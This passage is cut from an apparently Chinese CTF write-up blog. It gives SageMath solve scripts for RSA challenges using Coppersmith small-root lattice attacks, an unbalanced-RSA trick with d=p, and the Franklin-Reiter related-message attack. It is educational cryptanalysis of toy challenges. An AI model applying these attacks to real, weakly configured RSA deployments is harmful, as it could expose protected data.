sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">p = <span class="number">151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line">d1 = <span class="number">50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line">d2 = <span class="number">91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line">r1 = <span class="number">7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line">r2 = <span class="number">9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = (r1-r2)*(d1+x)*(d2+y)-(d2-d1)-(y-x)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">246</span>,<span class="number">2</span>^<span class="number">246</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    b1,b2 = root</span><br><span class="line">    s=(inverse(d1+b1,p)-r1)%p</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s)).decode())</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="️-铜匠的艺术i"><a class="markdownIt-Anchor" href="#️-铜匠的艺术i"></a> ⛏️ 铜匠的艺术Ⅰ</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">512</span></span><br><span class="line">N = <span class="number">1024</span></span><br><span class="line">P = <span class="number">256</span></span><br><span class="line">p = getPrime(P)</span><br><span class="line">q = getPrime(N-P)</span><br><span class="line">n = p * q</span><br><span class="line">d = p</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line"><span class="string">c = 85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>铜匠攻击<code>coppersmith</code><br /><a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/密码学学习笔记之coppersmith/</a><br />应用到了<code>boneh durfee attack</code>，问题是<code>e</code>未知<br /><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p><p><code>Lazzaro</code>佬的总结<a href="https://www.cnblogs.com/404p3rs0n/p/15542587.html">https://www.cnblogs.com/404p3rs0n/p/15542587.html</a><br />问了一下出题人，讲了一下想法，没有理我……</p><p>时隔半年，混成密码老手再来看这题，也是直接提取到关键信息了，<code>unbalanced rsa</code>，而且<code>d=p</code>是可以利用的，先看看<a href="https://blog.maple3142.net/2021/12/07/hitcon-ctf-2021-writeups/#a-little-easy-rsa">弱化版本</a><br />如果题目给出<code>e</code>的话，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>n</mi><mo>≡</mo><mi>e</mi><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo>≡</mo><mi>q</mi><mo>≡</mo><mi>e</mi><mo>∗</mo><mi>d</mi><mo>∗</mo><mi>q</mi><mo>≡</mo><mi>q</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*n\equiv e*p*q\equiv q\equiv e*d*q\equiv q\ mod\ \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo>∗</mo><mi>n</mi></mrow></msup><mo>≡</mo><msup><mn>2</mn><mi>q</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">2^{e*n}\equiv 2^{q}\ mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo>∗</mo><mi>n</mi></mrow></msup><mo>≡</mo><msup><mn>2</mn><mi>q</mi></msup><mo>≡</mo><mn>2</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e*n}\equiv 2^{q}\equiv 2\ mod\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>e</mi><mo>∗</mo><mi>n</mi></mrow></msup><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q=GCD(2^{e*n}-2,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>强化版，不给<code>e</code><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mo>∗</mo><mi>n</mi></mrow></msup><mo>≡</mo><mi>m</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c&#x27;\equiv m^{e*n}\equiv m\ mod\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><img src="https://picx.zhimg.com/80/v2-a4f09065668c095334e1bdd1a7478fab_1440w.png" alt="" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line">c = <span class="number">85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="built_in">pow</span>(c, n, n) - x</span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(beta=<span class="number">0.67</span>, epsilon=<span class="number">0.04</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id="叒是欧几里得"><a class="markdownIt-Anchor" href="#叒是欧几里得"></a> 😋 叒是欧几里得</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">240</span></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">delta = getPrime(<span class="number">1024</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta =&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 79724747744041714288953392952463874801997705081106902943284648733918149185753839937134265686183985428507199115581472568110843698105733584732275660165830029909359483267387801214496783177450040180595781619052234234214466384716761078975184418283511523324752507723140024391761761919034003871792556646981516016829</span></span><br><span class="line"><span class="string">delta = 126231068620420223973893815509531523980528675989214589653267161043503977208634759494599578611297423840582424158720324586085466134446749572141985881213834874797105681653543775703457635235713661837619943424874322621237629070789752447854720667927421977431676296802472297153819769740875671325555175485801487562317</span></span><br><span class="line"><span class="string">c1 = 36578233020971843140854855402047493686821205871189638550273647983442002301763881467104013416020830811359646176983834496945892080167342879776467612198963515145695205542184908041221340742020262320462349152920227384763155486786470112042989101020262194775511567104383189663255042081708258269604855798589456059252</span></span><br><span class="line"><span class="string">c2 = 217496152646372905195410265855757862997908815896427895285321483108430164363119052551898699474219390009044650355199849989937145012074237320274174148963137082335030402537136022883092093136277846069764849794019465924895060791502105277845493988301747611257009487302383938540250170857241135318332565447081257370</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n, e, b, c1, c2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X ^ e - c1</span><br><span class="line">    f2 = (X + b) ^ e - c2</span><br><span class="line">    <span class="comment"># 返回的是首一多项式，coefficients()返回多项式各项式的系数，项式次数递增，所以第0项是常数</span></span><br><span class="line">    m_ = GCD(f1, f2).coefficients()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_)  <span class="comment"># 由于tmp其实是 -m % n,所以这里给他转换回去。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()<span class="comment"># 返回首一多项式，即多项式最高次的项式系数为1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">delta = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    M = franklinReiter(n, e, i*delta, c1, c2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag=long_to_bytes((M-j*delta+n)%n)</span><br><span class="line">        <span class="comment"># 防止 M-j*delta 是负数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>翻阅学习<code>coppersmith</code>时学到的，<a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/密码学学习笔记之coppersmith/</a>，<code>Van1sh</code>Orzz，实例第五关</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1=(m+r_{1})^{e}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2=(m+r_{2})^{e}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_{1}=m+r_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span 